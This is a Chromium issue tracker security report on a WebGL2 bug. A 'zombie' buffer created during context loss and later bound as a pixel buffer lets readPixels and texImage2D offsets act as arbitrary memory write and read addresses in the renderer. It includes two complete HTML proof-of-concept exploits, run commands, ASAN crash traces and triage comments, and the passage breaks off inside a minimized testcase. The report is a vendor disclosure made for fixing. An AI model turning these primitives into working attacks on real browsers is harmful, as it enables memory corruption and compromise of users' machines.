# Arbitrary Memory Read/Write via WebGLBuffer Created During Context Loss Combined with PBO Operations

| Field | Value |
|-------|-------|
| **Issue ID** | [485935305](https://issues.chromium.org/issues/485935305) |
| **Status** | New |
| **Severity** | S4-Minimal |
| **Priority** | P0 |
| **Component** | Internals>GPU>Internals |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | je...@gmail.com |
| **Assignee** | ka...@google.com |
| **Created** | 2026-02-20 |
| **Bounty** | $90,000.00 |

## Description

# Arbitrary Memory Read/Write via WebGLBuffer Created During Context Loss Combined with PBO Operations

## Summary

A state synchronization failure exists between Blink and the GPU command decoder when handling WebGLBuffer objects created during context loss. When a buffer is created while the WebGL context is lost, its internal GL buffer ID remains zero. After context restoration, binding this zombie buffer to PIXEL\_PACK\_BUFFER or PIXEL\_UNPACK\_BUFFER causes Blink to believe a PBO is bound while the GPU layer sees no buffer. This enables two complementary attack primitives: calling readPixels with an offset parameter results in arbitrary memory writes, while calling texImage2D with an offset parameter results in arbitrary memory reads. Together these provide a complete read/write primitive in the renderer process where the attacker controls the addresses, content, and lengths.

## Bisect

The vulnerability has existed since the introduction of WebGL2 with Pixel Buffer Object support. The lack of validation for WebGLBuffer::HasObject() in the readPixels and texImage2D PBO paths has been present since the initial implementation.

PBO readPixels support: `05cdea84b962a` (WebGL 2: add readPixels API to read pixels into pixel pack buffer)

- Date: 2015-09-02
- Author: [yunchao.he@intel.com](mailto:yunchao.he@intel.com)
- Review: <https://codereview.chromium.org/1300573002>

PBO texImage2D support: `96c5d1c0d42d4` (Add WebGL 2 functions texImage2D/texImage3D with unpack buffer.)

- Date: 2016-02-23
- Author: [zmo@chromium.org](mailto:zmo@chromium.org)

## Root Cause

The vulnerability originates from how WebGLBuffer objects are constructed when the context is in a lost state. In the WebGLBuffer constructor, the GL buffer is only generated when the context is not lost.

```
// third_party/blink/renderer/modules/webgl/webgl_buffer.cc
WebGLBuffer::WebGLBuffer(WebGLContextObjectSupport* ctx)
    : WebGLObject(ctx), initial_target_(0), size_(0) {
  if (!ctx->IsLost()) {
    GLuint buffer;
    ctx->ContextGL()->GenBuffers(1, &buffer);
    SetObject(buffer);
  }
}

```

When the context is lost, SetObject is never called, leaving the internal object\_ member at its default value of zero. The createBuffer function does not check isContextLost before instantiating the buffer, allowing the creation of these zombie buffers.

When the context is restored and this zombie buffer is bound to PIXEL\_PACK\_BUFFER or PIXEL\_UNPACK\_BUFFER, the binding succeeds at the Blink level. The bound buffer member is set to the non-null WebGLBuffer pointer. However, the actual GL binding uses ObjectOrZero which returns zero, effectively binding no buffer at the GPU layer.

A crucial detail enables exploitation with arbitrary addresses. In BufferDataImpl, the buffer size is set before the GL call executes.

```
// third_party/blink/renderer/modules/webgl/webgl_rendering_context_base.cc
void WebGLRenderingContextBase::BufferDataImpl(GLenum target,
                                               int64_t size,
                                               const void* data,
                                               GLenum usage) {
  WebGLBuffer* buffer = ValidateBufferDataTarget("bufferData", target);
  if (!buffer)
    return;
  // ...
  buffer->SetSize(size);  // Size set BEFORE GL call
  ContextGL()->BufferData(target, static_cast<GLsizeiptr>(size), data, usage);
}

```

This means even though the GPU-side BufferData fails because no buffer is bound, the Blink-side size\_ is already updated. By calling bufferData with a size larger than the intended attack offset, the validation check passes, allowing subsequent operations to proceed to the GPU layer.

### Arbitrary Write via readPixels

The readPixels function that accepts an offset parameter only verifies that bound\_pixel\_pack\_buffer\_ is non-null, without checking whether the buffer has a valid GL object.

```
// third_party/blink/renderer/modules/webgl/webgl2_rendering_context_base.cc
void WebGL2RenderingContextBase::readPixels(GLint x, GLint y,
                                            GLsizei width, GLsizei height,
                                            GLenum format, GLenum type,
                                            int64_t offset) {
  // ...
  WebGLBuffer* buffer = bound_pixel_pack_buffer_.Get();
  if (!buffer) {
    SynthesizeGLError(GL_INVALID_OPERATION, "readPixels",
                      "no PIXEL_PACK buffer bound");
    return;
  }
  // No check for buffer->HasObject()!
  ContextGL()->ReadPixels(x, y, width, height, format, type,
                          reinterpret_cast<void*>(offset));
}

```

In GLES2Implementation::ReadPixels, the bound\_pixel\_pack\_buffer\_ check uses the actual GL buffer ID which is zero.

```
// gpu/command_buffer/client/gles2_implementation.cc
if (bound_pixel_pack_buffer_) {
  helper_->ReadPixels(..., offset.ValueOrDefault(0), ...);
  return;
}
// No PBO path: treat pixels as real pointer
int8_t* dest = reinterpret_cast<int8_t*>(pixels);
// ...
UNSAFE_TODO(memcpy(dest, src, copy_size));

```

Since bound\_pixel\_pack\_buffer\_ is zero at the GPU layer, the code falls through to the non-PBO path where it interprets the offset value as an actual memory address and performs a memcpy to that address.

### Arbitrary Read via texImage2D

Similarly, the texImage2D function that accepts an offset parameter only verifies that bound\_pixel\_unpack\_buffer\_ is non-null.

```
// third_party/blink/renderer/modules/webgl/webgl2_rendering_context_base.cc
void WebGL2RenderingContextBase::texImage2D(GLenum target, GLint level,
                                            GLint internalformat,
                                            GLsizei width, GLsizei height,
                                            GLint border, GLenum format,
                                            GLenum type, int64_t offset) {
  // ...
  if (!bound_pixel_unpack_buffer_) {
    SynthesizeGLError(GL_INVALID_OPERATION, "texImage2D",
                      "no bound PIXEL_UNPACK_BUFFER");
    return;
  }
  // No check for buffer->HasObject()!
  ContextGL()->TexImage2D(..., reinterpret_cast<const void*>(offset));
}

```

In GLES2Implementation::TexImage2D, the bound\_pixel\_unpack\_buffer\_ check uses the actual GL buffer ID which is zero.

```
// gpu/command_buffer/client/gles2_implementation.cc
if (bound_pixel_unpack_buffer_) {
  helper_->TexImage2D(..., offset.ValueOrDefault(0));
  return;
}
// No PBO path: treat pixels as real pointer, advance and copy
pixels = UNSAFE_TODO(reinterpret_cast<const int8_t*>(pixels) + skip_size);
// ...
CopyRectToBuffer(pixels, height, unpadded_row_size, padded_row_size,
                 buffer_pointer, service_padded_row_size);

```

Since bound\_pixel\_unpack\_buffer\_ is zero at the GPU layer, the code falls through to the non-PBO path where it interprets the offset value as an actual memory address and reads data from that address.

## Reproduce

### Arbitrary Write PoC

Save the following HTML file and open it in Chrome with ASAN enabled.

```
<!DOCTYPE html>
<html>
<head>
<title>WebGL PBO Arbitrary Write PoC</title>
<style>
body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
pre { white-space: pre-wrap; }
.error { color: #f00; }
.warn { color: #ff0; }
.success { color: #0ff; }
</style>
</head>
<body>
<h2>WebGL2 PBO Context Lost Arbitrary Write PoC</h2>
<canvas id="canvas" width="64" height="64"></canvas>
<pre id="log"></pre>

<script>
const logEl = document.getElementById('log');
function log(msg, type = '') {
    const line = document.createElement('span');
    line.className = type;
    line.textContent = msg + '\n';
    logEl.appendChild(line);
    console.log(msg);
}

async function main() {
    log('=== WebGL2 PBO Arbitrary Write Vulnerability PoC ===\n');

    const canvas = document.getElementById('canvas');
    const gl = canvas.getContext('webgl2');

    if (!gl) {
        log('ERROR: WebGL2 not available', 'error');
        return;
    }
    log('[1] WebGL2 context created', 'success');

    const loseContextExt = gl.getExtension('WEBGL_lose_context');
    if (!loseContextExt) {
        log('ERROR: WEBGL_lose_context extension not available', 'error');
        return;
    }
    log('[2] WEBGL_lose_context extension acquired', 'success');

    let zombieBuffer = null;

    canvas.addEventListener('webglcontextlost', (e) => {
        log('\n[EVENT] webglcontextlost fired');
        e.preventDefault();
        log('  preventDefault() called - context can be restored');

        zombieBuffer = gl.createBuffer();
        log('  Created zombie buffer during context lost: ' + zombieBuffer);
        log('  Internal GL buffer ID should be 0 (not generated)', 'warn');

        setTimeout(() => {
            log('\n[3] Calling restoreContext()...');
            loseContextExt.restoreContext();
        }, 100);
    });

    canvas.addEventListener('webglcontextrestored', async (e) => {
        log('\n[EVENT] webglcontextrestored fired', 'success');

        if (!zombieBuffer) {
            log('ERROR: zombieBuffer is null', 'error');
            return;
        }

        log('\n[4] Context restored - zombie buffer still exists');
        log('  zombieBuffer object: ' + zombieBuffer);

        log('\n[5] Binding zombie buffer to PIXEL_PACK_BUFFER...');
        gl.bindBuffer(gl.PIXEL_PACK_BUFFER, zombieBuffer);

        let err = gl.getError();
        if (err !== gl.NO_ERROR) {
            log('  bindBuffer error: 0x' + err.toString(16), 'error');
            return;
        }
        log('  bindBuffer succeeded (Blink thinks PBO is bound)', 'success');
        log('  But GPU layer has bound_pixel_pack_buffer_ = 0!', 'warn');

        const bufferSize = 0x50000000;
        log('\n[6] Calling bufferData to set size = 0x' + bufferSize.toString(16) + ' (' + bufferSize + ')');
        gl.bufferData(gl.PIXEL_PACK_BUFFER, bufferSize, gl.STREAM_READ);

        err = gl.getError();
        log('  bufferData result: ' + (err === gl.NO_ERROR ? 'NO_ERROR' : 'GL_ERROR 0x' + err.toString(16)));

        log('\n[7] Drawing pattern to framebuffer (attacker-controlled data)');
        gl.clearColor(0.5, 0.25, 0.75, 1.0);
        gl.clear(gl.COLOR_BUFFER_BIT);

        const attackAddr = 0x41414141;

        log('\n[8] Attempting readPixels with offset = 0x' + attackAddr.toString(16), 'warn');
        log('  Blink: PBO bound, offset = 0x' + attackAddr.toString(16));
        log('  GPU: No PBO, pixels = (void*)0x' + attackAddr.toString(16) + ' <- ARBITRARY WRITE!', 'error');

        try {
            log('\n[9] Calling gl.readPixels(0, 0, 4, 4, RGBA, UNSIGNED_BYTE, 0x' + attackAddr.toString(16) + ')');
            gl.readPixels(0, 0, 4, 4, gl.RGBA, gl.UNSIGNED_BYTE, attackAddr);

            err = gl.getError();
            if (err === gl.NO_ERROR) {
                log('  readPixels returned NO_ERROR', 'warn');
                log('  VULNERABILITY CONFIRMED: GPU tried to write to address 0x' + attackAddr.toString(16), 'error');
            } else {
                log('  readPixels returned GL_ERROR: 0x' + err.toString(16));
            }
        } catch (e) {
            log('  Exception: ' + e, 'error');
            log('  (Crash expected - GPU tried to memcpy to 0x' + attackAddr.toString(16) + ')', 'warn');
        }

        log('\n=== Summary ===');
        log('The vulnerability allows arbitrary memory writes in the renderer process:');
        log('1. Create WebGLBuffer during context lost -> object_ = 0');
        log('2. Restore context, bind zombie buffer to PIXEL_PACK_BUFFER');
        log('3. Blink thinks PBO is bound, GPU thinks no PBO');
        log('4. readPixels(offset) -> GPU does memcpy to (void*)offset');
        log('5. Attacker controls: write address (offset), data (pixels), length (w*h*4)');
    });

    log('\n[3] Triggering context loss...');
    loseContextExt.loseContext();
}

main().catch(e => log('Error: ' + e, 'error'));
</script>
</body>
</html>

```

Run Chrome with ASAN enabled.

```
export ASAN_OPTIONS="detect_odr_violation=0"
./out/asan-release/chrome \
    --no-sandbox \
    --user-data-dir=/tmp/webgl_pbo_test \
    --disable-extensions \
    --no-first-run \
    --enable-logging=stderr \
    "file:///path/to/poc_write.html"

```

The following output demonstrates the arbitrary write vulnerability being triggered.

```
[1021508:1021508:0220/114011.246986:INFO:CONSOLE:25] "[1] WebGL2 context created", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_write.html (25)
[1021508:1021508:0220/114011.247320:INFO:CONSOLE:25] "[2] WEBGL_lose_context extension acquired", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_write.html (25)
[1021508:1021508:0220/114011.247479:INFO:CONSOLE:25] "
[3] Triggering context loss...", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_write.html (25)
[1021508:1021508:0220/114011.289547:INFO:CONSOLE:25] "
[EVENT] webglcontextlost fired", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_write.html (25)
[1021508:1021508:0220/114011.289705:INFO:CONSOLE:25] "  preventDefault() called - context can be restored", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_write.html (25)
[1021508:1021508:0220/114011.289846:INFO:CONSOLE:25] "  Created zombie buffer during context lost: [object WebGLBuffer]", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_write.html (25)
[1021508:1021508:0220/114011.289969:INFO:CONSOLE:25] "  Internal GL buffer ID should be 0 (not generated)", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_write.html (25)
[1021508:1021508:0220/114011.391774:INFO:CONSOLE:25] "
[3] Calling restoreContext()...", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_write.html (25)
[1021508:1021508:0220/114011.597957:INFO:CONSOLE:25] "
[EVENT] webglcontextrestored fired", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_write.html (25)
[1021508:1021508:0220/114011.598287:INFO:CONSOLE:25] "
[5] Binding zombie buffer to PIXEL_PACK_BUFFER...", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_write.html (25)
[1021508:1021508:0220/114011.798587:INFO:CONSOLE:25] "  bindBuffer succeeded (Blink thinks PBO is bound)", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_write.html (25)
[1021508:1021508:0220/114011.798801:INFO:CONSOLE:25] "  But GPU layer has bound_pixel_pack_buffer_ = 0!", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_write.html (25)
[1021508:1021508:0220/114011.798964:INFO:CONSOLE:25] "
[6] Calling bufferData to set size = 0x50000000 (1342177280)", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_write.html (25)
[1021547:1021547:0220/114011.809697:ERROR:gpu/command_buffer/service/gl_utils.cc:427] [.WebGL-0x7da0b4f2fa80] GL_INVALID_OPERATION: glBufferData: A buffer must be bound.
[1021508:1021508:0220/114011.810908:INFO:CONSOLE:25] "  bufferData result: GL_ERROR 0x502", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_write.html (25)
[1021508:1021508:0220/114011.811259:INFO:CONSOLE:25] "
[8] Attempting readPixels with offset = 0x41414141", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_write.html (25)
[1021508:1021508:0220/114011.811806:INFO:CONSOLE:25] "
[9] Calling gl.readPixels(0, 0, 4, 4, RGBA, UNSIGNED_BYTE, 0x41414141)", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_write.html (25)
Received signal 11 SEGV_MAPERR 000041414141
#0 0x55dfa0b56006 (/home/user/chromium/src/out/asan-release/chrome+0x6791005)
#1 0x7ff13375eb72 (/home/user/chromium/src/out/asan-release/libbase.so+0x75eb71)
#2 0x7ff1337043e3 (/home/user/chromium/src/out/asan-release/libbase.so+0x7043e2)
#3 0x7ff13375de0b (/home/user/chromium/src/out/asan-release/libbase.so+0x75de0a)
#4 0x7ff0c2e42520 (/usr/lib/x86_64-linux-gnu/libc.so.6+0x4251f)
#5 0x7ff0c2ec49fb (/usr/lib/x86_64-linux-gnu/libc.so.6+0xc49fa)
#6 0x55dfa0bae23c (/home/user/chromium/src/out/asan-release/chrome+0x67e923b)
#7 0x7ff0c5b18ac5 (/home/user/chromium/src/out/asan-release/libgpu_command_buffer_client_gles2_implementation.so+0xbfac4)
#8 0x7ff0cb70ec53 (/home/user/chromium/src/out/asan-release/libblink_modules.so+0x4d0ec52)
#9 0x7ff0c96a6262 (/home/user/chromium/src/out/asan-release/libblink_modules.so+0x2ca6261)
#10 0x7bf096c106a4 <unknown>
  r8: 0000000008282828  r9: 0000000041414180 r10: 0000000008282830 r11: 000000008827a828
 r12: 000000008827a830 r13: ffffffffffffffff r14: 0000000000000040 r15: 00000f7e967e9d00
  di: 0000000041414141  si: 00007bf0004a4040  bp: 00007ffece9eaa30  bx: 0000000000000000
  dx: 0000000000000040  ax: 0000000041414141  cx: 000000008827a830  sp: 00007ffece9ea1e8
  ip: 00007ff0c2ec49fb efl: 0000000000010246 cgf: 002b000000000033 erf: 0000000000000006
 trp: 000000000000000e msk: 0000000000000000 cr2: 0000000041414141
[end of stack trace]

```

The crash at cr2: 0000000041414141 with erf: 0000000000000006 confirms that the GPU layer attempted to write to the attacker-controlled address 0x41414141.

### Arbitrary Read PoC

Save the following HTML file and open it in Chrome with ASAN enabled.

```
<!DOCTYPE html>
<html>
<head>
<title>WebGL PBO Arbitrary Read PoC</title>
<style>
body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
pre { white-space: pre-wrap; }
.error { color: #f00; }
.warn { color: #ff0; }
.success { color: #0ff; }
</style>
</head>
<body>
<h2>WebGL2 PBO Context Lost Arbitrary Read PoC</h2>
<canvas id="canvas" width="64" height="64"></canvas>
<pre id="log"></pre>

<script>
const logEl = document.getElementById('log');
function log(msg, type = '') {
    const line = document.createElement('span');
    line.className = type;
    line.textContent = msg + '\n';
    logEl.appendChild(line);
    console.log(msg);
}

async function main() {
    log('=== WebGL2 PBO Arbitrary Read Vulnerability PoC ===\n');

    const canvas = document.getElementById('canvas');
    const gl = canvas.getContext('webgl2');

    if (!gl) {
        log('ERROR: WebGL2 not available', 'error');
        return;
    }
    log('[1] WebGL2 context created', 'success');

    const loseContextExt = gl.getExtension('WEBGL_lose_context');
    if (!loseContextExt) {
        log('ERROR: WEBGL_lose_context extension not available', 'error');
        return;
    }
    log('[2] WEBGL_lose_context extension acquired', 'success');

    let zombieBuffer = null;

    canvas.addEventListener('webglcontextlost', (e) => {
        log('\n[EVENT] webglcontextlost fired');
        e.preventDefault();
        log('  preventDefault() called - context can be restored');

        zombieBuffer = gl.createBuffer();
        log('  Created zombie buffer during context lost: ' + zombieBuffer);
        log('  Internal GL buffer ID should be 0 (not generated)', 'warn');

        setTimeout(() => {
            log('\n[3] Calling restoreContext()...');
            loseContextExt.restoreContext();
        }, 100);
    });

    canvas.addEventListener('webglcontextrestored', async (e) => {
        log('\n[EVENT] webglcontextrestored fired', 'success');

        if (!zombieBuffer) {
            log('ERROR: zombieBuffer is null', 'error');
            return;
        }

        log('\n[4] Context restored - zombie buffer still exists');
        log('  zombieBuffer object: ' + zombieBuffer);

        log('\n[5] Binding zombie buffer to PIXEL_UNPACK_BUFFER...');
        gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, zombieBuffer);

        let err = gl.getError();
        if (err !== gl.NO_ERROR) {
            log('  bindBuffer error: 0x' + err.toString(16), 'error');
            return;
        }
        log('  bindBuffer succeeded (Blink thinks PBO is bound)', 'success');
        log('  But GPU layer has bound_pixel_unpack_buffer_ = 0!', 'warn');

        const bufferSize = 0x50000000;
        log('\n[6] Calling bufferData to set size = 0x' + bufferSize.toString(16));
        gl.bufferData(gl.PIXEL_UNPACK_BUFFER, bufferSize, gl.STREAM_READ);

        err = gl.getError();
        log('  bufferData result: ' + (err === gl.NO_ERROR ? 'NO_ERROR' : 'GL_ERROR 0x' + err.toString(16)));

        log('\n[7] Creating texture for upload...');
        const texture = gl.createTexture();
        gl.bindTexture(gl.TEXTURE_2D, texture);

        const attackAddr = 0x41414141;

        log('\n[8] Attempting texImage2D with offset = 0x' + attackAddr.toString(16), 'warn');
        log('  Blink: PBO bound, offset = 0x' + attackAddr.toString(16));
        log('  GPU: No PBO, pixels = (void*)0x' + attackAddr.toString(16) + ' <- ARBITRARY READ!', 'error');

        try {
            log('\n[9] Calling gl.texImage2D(TEXTURE_2D, 0, RGBA, 4, 4, 0, RGBA, UNSIGNED_BYTE, 0x' + attackAddr.toString(16) + ')');
            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4, 4, 0, gl.RGBA, gl.UNSIGNED_BYTE, attackAddr);

            err = gl.getError();
            if (err === gl.NO_ERROR) {
                log('  texImage2D returned NO_ERROR', 'warn');
                log('  VULNERABILITY CONFIRMED: GPU tried to read from address 0x' + attackAddr.toString(16), 'error');
            } else {
                log('  texImage2D returned GL_ERROR: 0x' + err.toString(16));
            }
        } catch (e) {
            log('  Exception: ' + e, 'error');
            log('  (Crash expected - GPU tried to read from 0x' + attackAddr.toString(16) + ')', 'warn');
        }

        log('\n=== Summary ===');
        log('The vulnerability allows arbitrary memory reads in the renderer process:');
        log('1. Create WebGLBuffer during context lost -> object_ = 0');
        log('2. Restore context, bind zombie buffer to PIXEL_UNPACK_BUFFER');
        log('3. Blink thinks PBO is bound, GPU thinks no PBO');
        log('4. texImage2D(offset) -> GPU does CopyRectToBuffer from (void*)offset');
        log('5. Attacker controls: read address (offset), read length (w*h*4)');
        log('6. Combined with readPixels, this enables full read/write primitive');
    });

    log('\n[3] Triggering context loss...');
    loseContextExt.loseContext();
}

main().catch(e => log('Error: ' + e, 'error'));
</script>
</body>
</html>

```

Run Chrome with ASAN enabled.

```
export ASAN_OPTIONS="detect_odr_violation=0"
./out/asan-release/chrome \
    --no-sandbox \
    --user-data-dir=/tmp/webgl_pbo_test \
    --disable-extensions \
    --no-first-run \
    --enable-logging=stderr \
    "file:///path/to/poc_read.html"

```

The following output demonstrates the arbitrary read vulnerability being triggered.

```
[1023209:1023209:0220/114833.924771:INFO:CONSOLE:25] "[1] WebGL2 context created", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_read.html (25)
[1023209:1023209:0220/114833.924947:INFO:CONSOLE:25] "[2] WEBGL_lose_context extension acquired", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_read.html (25)
[1023209:1023209:0220/114833.925045:INFO:CONSOLE:25] "
[3] Triggering context loss...", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_read.html (25)
[1023209:1023209:0220/114833.952744:INFO:CONSOLE:25] "
[EVENT] webglcontextlost fired", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_read.html (25)
[1023209:1023209:0220/114833.952920:INFO:CONSOLE:25] "  preventDefault() called - context can be restored", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_read.html (25)
[1023209:1023209:0220/114833.953114:INFO:CONSOLE:25] "  Created zombie buffer during context lost: [object WebGLBuffer]", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_read.html (25)
[1023209:1023209:0220/114833.953236:INFO:CONSOLE:25] "  Internal GL buffer ID should be 0 (not generated)", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_read.html (25)
[1023209:1023209:0220/114834.054936:INFO:CONSOLE:25] "
[3] Calling restoreContext()...", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_read.html (25)
[1023209:1023209:0220/114834.273765:INFO:CONSOLE:25] "
[EVENT] webglcontextrestored fired", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_read.html (25)
[1023209:1023209:0220/114834.275367:INFO:CONSOLE:25] "
[5] Binding zombie buffer to PIXEL_UNPACK_BUFFER...", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_read.html (25)
[1023209:1023209:0220/114834.475592:INFO:CONSOLE:25] "  bindBuffer succeeded (Blink thinks PBO is bound)", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_read.html (25)
[1023209:1023209:0220/114834.475814:INFO:CONSOLE:25] "  But GPU layer has bound_pixel_unpack_buffer_ = 0!", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_read.html (25)
[1023209:1023209:0220/114834.476028:INFO:CONSOLE:25] "
[6] Calling bufferData to set size = 0x50000000", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_read.html (25)
[1023298:1023298:0220/114834.487163:ERROR:gpu/command_buffer/service/gl_utils.cc:427] [.WebGL-0x7cce1372fa80] GL_INVALID_OPERATION: glBufferData: A buffer must be bound.
[1023209:1023209:0220/114834.488303:INFO:CONSOLE:25] "  bufferData result: GL_ERROR 0x502", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_read.html (25)
[1023209:1023209:0220/114834.488432:INFO:CONSOLE:25] "
[7] Creating texture for upload...", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_read.html (25)
[1023209:1023209:0220/114834.488827:INFO:CONSOLE:25] "
[8] Attempting texImage2D with offset = 0x41414141", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_read.html (25)
[1023209:1023209:0220/114834.489462:INFO:CONSOLE:25] "
[9] Calling gl.texImage2D(TEXTURE_2D, 0, RGBA, 4, 4, 0, RGBA, UNSIGNED_BYTE, 0x41414141)", source: file:///home/user/chromium/src/poc_webgl_pbo_arbitrary_read.html (25)
Received signal 11 SEGV_MAPERR 000041414141
#0 0x55daa47e2006 (/home/user/chromium/src/out/asan-release/chrome+0x6791005)
#1 0x7f1e91f5eb72 (/home/user/chromium/src/out/asan-release/libbase.so+0x75eb71)
#2 0x7f1e91f043e3 (/home/user/chromium/src/out/asan-release/libbase.so+0x7043e2)
#3 0x7f1e91f5de0b (/home/user/chromium/src/out/asan-release/libbase.so+0x75de0a)
#4 0x7f1e21642520 (/usr/lib/x86_64-linux-gnu/libc.so.6+0x4251f)
#5 0x7f1e216c4881 (/usr/lib/x86_64-linux-gnu/libc.so.6+0xc4880)
#6 0x55daa483a23c (/home/user/chromium/src/out/asan-release/chrome+0x67e923b)
#7 0x7f1e243076ba (/home/user/chromium/src/out/asan-release/libgpu_command_buffer_client_gles2_implementation.so+0xae6b9)
#8 0x7f1e29f10753 (/home/user/chromium/src/out/asan-release/libblink_modules.so+0x4d10752)
#9 0x7f1e27eac9d8 (/home/user/chromium/src/out/asan-release/libblink_modules.so+0x2cac9d7)
#10 0x7b19f53d06a4 <unknown>
  r8: 00000f632b587808  r9: 00007b195ac3c07f r10: 00000f632b58780f r11: 00000f63ab57f808
 r12: 00000f63ab57f808 r13: ffffffffffffffff r14: 00007b195ac3c040 r15: 00007b1e126d1000
  di: 00007b195ac3c040  si: 0000000041414141  bp: 00007ffd90ed0730  bx: 0000000000000000
  dx: 0000000000000040  ax: 00007b195ac3c040  cx: 00000f63ab57f80f  sp: 00007ffd90ecfee8
  ip: 00007f1e216c4881 efl: 0000000000010206 cgf: 002b000000000033 erf: 0000000000000004
 trp: 000000000000000e msk: 0000000000000000 cr2: 0000000041414141
[end of stack trace]

```

The crash at cr2: 0000000041414141 with erf: 0000000000000004 confirms that the GPU layer attempted to read from the attacker-controlled address 0x41414141. Note the difference in erf values between read (0x04) and write (0x06) operations.

Together, these two vulnerabilities provide a complete arbitrary read/write primitive in the renderer process. The attacker controls the target address via the offset parameter, the read/write length via the width and height parameters, and for writes, the data content via framebuffer pixels controlled through drawing operations.

## Credit

c6eed09fc8b174b0f3eebedcceb1e792

## Attachments

- [readme.md](attachments/readme.md) (text/markdown, 2.4 KB)
- [pa_discover.sh](attachments/pa_discover.sh) (text/x-sh, 1.6 KB)
- [writeup.md](attachments/writeup.md) (text/markdown, 24.1 KB)
- [exp.html](attachments/exp.html) (text/html, 18.6 KB)

## Timeline

### cl...@appspot.gserviceaccount.com (2026-02-23)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4879034999570432.

### 24...@project.gserviceaccount.com (2026-02-24)

Detailed Report: https://clusterfuzz.com/testcase?key=4879034999570432

Fuzzer: None
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: UNKNOWN WRITE
Crash Address: 0x000041414141
Crash State:
  gpu::gles2::GLES2Implementation::ReadPixels
  blink::WebGL2RenderingContextBase::readPixels
  blink::v8_webgl2_rendering_context::ReadPixelsOperationCallback
  
Sanitizer: address (ASAN)

Recommended Security Severity: Critical

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=1418926:1418957

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=4879034999570432

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary.

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### 24...@project.gserviceaccount.com (2026-02-24)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### 24...@project.gserviceaccount.com (2026-02-24)

Automatically assigning owner based on suspected regression changelist https://chromium.googlesource.com/chromium/src/+/be9e870598bc1b5b643cd3c015ec83927de5574a (Make WebGL object creation infallible under context loss.

The WebGL spec was recently revised so that even if the context is
lost, creation of objects like buffers and textures returns non-null
objects at the ECMAScript level. Implement this change throughout and
perform new null-checks as necessary to guard against context loss.

Remove obsolete copies of OffscreenCanvas context loss/restored tests
from WPT; these are tested by all browser vendors in the WebGL
conformance suite.

Also remove incorrect handling of the NUM_SHADER_BINARY_FORMATS enum.

Fixes the following WebGL conformance test failures:

  conformance/context/context-lost-restored.html
  conformance/context/context-lost.html
  conformance/offscreencanvas/context-lost-restored-worker.html
  conformance/offscreencanvas/context-lost-restored.html
  conformance/offscreencanvas/context-lost-worker.html
  conformance/offscreencanvas/context-lost.html
  conformance/state/gl-enum-tests.html

Suppress a flake of out-of-bounds-uniform-array-access.html on
Win/D3D9/Intel.

Fixed: 371971708, 395934162
Change-Id: I6f272cec9ca6b3c554c541ba9b05a7eb442da660
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6251718
Reviewed-by: Gregg Tavares <gman@chromium.org>
Commit-Queue: Kenneth Russell <kbr@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1418953}
).

If this is incorrect, please let us know why and apply the hotlistid:5433122. If you aren't the correct owner for this issue, please unassign yourself as soon as possible so it can be re-triaged.

### ch...@google.com (2026-02-25)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-02-25)

Setting Priority to P0 to match Severity s0. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### ka...@chromium.org (2026-03-04)

For ease of access here's the minimized testcase that clusterfuzz generated (to help turning this into a conformance test):

```
<canvas id=canvas><script>
    const gl = canvas.getContext('webgl2');
    const loseContextExt = gl.getExtension('WEBGL_lose_context');
    canvas.addEventListener('webglcontextlost',e => {
        e.preventDefault();
        zombieBuffer = gl.createBuffer();
        setTimeout(() => {
            loseContextExt.restoreContext();
        });
    });
    canvas.addEventListener('webglcontextrestored', async => {
        gl.bindBuffer(gl.PIXEL_PACK_BUFFER, zombieBuffer);
        const bufferSize = 0x50000000;
